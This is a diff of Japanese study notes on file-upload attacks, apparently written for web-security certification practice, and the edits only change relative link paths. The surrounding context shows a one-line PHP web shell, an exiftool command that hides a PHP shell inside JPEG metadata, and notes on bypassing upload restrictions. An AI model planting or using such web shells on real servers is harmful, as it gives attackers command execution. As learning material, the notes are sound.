@@ -187,7 +187,7 @@ Content-Length: 39
 
 <?php echo system($_GET['command']); ?>
 ```
-- [1. 情報開示の基本と対策](../Information%20disclosure/1.%20情報開示の基本と対策.md)へとつながるかもだが、Web shellは難しくなる
+- [1. 情報開示の基本と対策](../../../BSCP/Server-side/Information%20disclosure/1.%20情報開示の基本と対策.md)へとつながるかもだが、Web shellは難しくなる
 
 ### 特定ディレクトリの実行制限バイパス概要
 
@@ -223,7 +223,7 @@ Content-Type: text/php
 	- 例えば、`http://TARGET_NET/files/shell.php`を開くとWeb shellを実行できるようになる
 	- ファイルパスは正規の拡張子ファイルをアップロードすることでわかることがある
 
-- 必要に応じて[Path traversal](../Path%20traversal/Path%20traversal.md#サニタイジング等の防御を突破する方法)を使用する
+- 必要に応じて[Path traversal](../../../BSCP/Server-side/Path%20traversal/Path%20traversal.md#サニタイジング等の防御を突破する方法)を使用する
 
 ## 応用：rootユーザーのSSHのauthorized_keys上書き
 
@@ -402,7 +402,7 @@ http://<TargetIP>/<path>/shell.jpg?cmd=whoami
 ## コンテンツ検証の回避概要
 
 - *ExifTool*を使用し、メタデータ内に悪意のあるコードを含むポリグロットJPEGファイルを作成する
-	- [📕](../../Misc/📕.md#ポリグロット(polyglot)) [📕](../../Misc/📕.md#メタデータ)
+	- [📕](../../../BSCP/Misc/📕.md#ポリグロット(polyglot)) [📕](../../../BSCP/Misc/📕.md#メタデータ)
 
 ## polyglot作成によるコンテンツ検証の回避実践
 
@@ -427,7 +427,7 @@ exiftool -Comment="<?php echo system($_GET['cmd']); ?>" image.jpg -o polyglot.ph
 ```
 https://EXPLOIT_DOMAIN/shell.php#hoge.jpg
 ```
-- [2.  一般的なSSRF防御の回避](../SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)
+- [2.  一般的なSSRF防御の回避](../../../BSCP/Server-side/SSRF/2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)
 
 ---
 
